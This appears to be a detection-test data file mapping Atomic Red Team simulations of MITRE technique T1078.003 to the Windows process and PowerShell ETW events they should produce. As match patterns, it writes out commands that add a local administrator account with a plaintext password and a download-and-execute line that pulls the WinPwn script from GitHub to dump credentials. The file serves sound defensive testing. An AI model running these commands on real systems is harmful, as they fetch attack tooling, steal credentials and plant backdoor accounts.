T1078.003,windows,a524ce99,Create local account with admin privileges
ARG,password,-4RTisCool!-321
_E_,Process,cmdline~=net user art-test /add
_E_,Process,cmdline~=net user art-test #{password}
_E_,Process,cmdline~=net localgroup administrators art-test /add

T1078.003,windows,9e9fd066,WinPwn - Loot local Credentials - powerhell kittie
_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
_E_,ETW,event_msg~=Creating Scriptblock text
_E_,ETW,event_data_list~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
_E_,ETW,event_data_list~=obfuskittiedump -consoleoutput -noninteractive

T1078.003,windows,e9fdb899,WinPwn - Loot local Credentials - Safetykatz
_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
_E_,ETW,event_msg~=Creating Scriptblock text
_E_,ETW,event_data_list~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
_E_,ETW,event_data_list~=safedump -consoleoutput -noninteractive

